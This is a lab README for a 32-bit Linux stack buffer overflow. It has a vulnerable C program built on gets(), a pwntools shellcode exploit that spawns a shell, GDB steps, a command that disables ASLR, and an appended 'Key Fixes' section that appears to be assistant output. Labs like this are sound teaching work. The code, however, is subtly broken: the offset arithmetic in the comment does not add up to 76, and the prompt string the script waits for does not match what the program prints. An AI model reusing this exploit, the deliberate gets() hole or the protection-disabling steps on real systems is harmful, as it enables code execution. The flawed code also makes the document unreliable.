# Buffer Overflow Exploit (32-bit Linux)

A demonstration of a **stack-based buffer overflow** exploit against a vulnerable C program, spawning a shell via shellcode injection.

## 📋 Prerequisites
- **Linux environment** (Tested on WSL2 x86_64, but targets 32-bit binaries).
- Python 3.x with `pwntools` installed:
  ```bash
  pip install pwntools
32-bit GCC (to compile the vulnerable program):

bash
sudo apt install gcc-multilib
🎯 Vulnerable Program
Source: vuln.c

c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[64];
    gets(buffer); // No bounds checking!
}

int main() {
    printf("Welcome to vulnerable program!\n");
    vuln();
    return 0;
}
Compilation
Disable stack protections for the lab:

bash
gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln_binary
💥 Exploit Script
File: exploit.py
Uses pwntools to inject shellcode and hijack control flow.

python
from pwn import *

context(os='linux', arch='i386')
binary = './vuln_binary'
elf = ELF(binary)

# Start process
p = process(binary)

# Shellcode (executes /bin/sh)
shellcode = asm(shellcraft.sh())
nop_sled = b"\x90" * 16  # NOP sled for reliability

# Payload structure
offset = 76  # 64 buffer + 12 padding + 4 EBP + 4 RET
buffer_addr = 0xffffd510  # REPLACE with your buffer's address (find via GDB)

payload = nop_sled + shellcode
payload += b"A" * (offset - len(nop_sled) - len(shellcode))
payload += p32(buffer_addr)  # Overwrite RET to jump to shellcode

p.sendlineafter("Welcome!\n", payload)
p.interactive()  # Spawns shell if successful
🔍 Debugging Notes
Find buffer Address:

bash
gdb ./vuln_binary
b vuln
run
print &buffer
Update buffer_addr in the exploit script with this value.

Common Issues:

Segmentation Fault (SIGSEGV): Incorrect return address or misaligned payload.

ASLR: Disable it for testing:

bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
🚀 Expected Output
Successful exploit grants a shell:

bash
$ whoami
your_username
📜 License
MIT

text

---

### 🔧 **Key Fixes for Your Exploit**  
1. **Confirm `buffer` Address**:  
   - Run `gdb ./vuln_binary`, set a breakpoint at `vuln()`, and check `&buffer`.  
   - Replace `0xffffd510` in the script with the actual address.  

2. **Check Payload Alignment**:  
   - Ensure `offset` is correct (76 bytes for 32-bit: `64 buffer + 12 filler + 4 EBP + 4 RET`).  

3. **Debug with GDB**:  
   ```bash
   gdb -q ./vuln_binary
   run < <(python3 exploit.py)
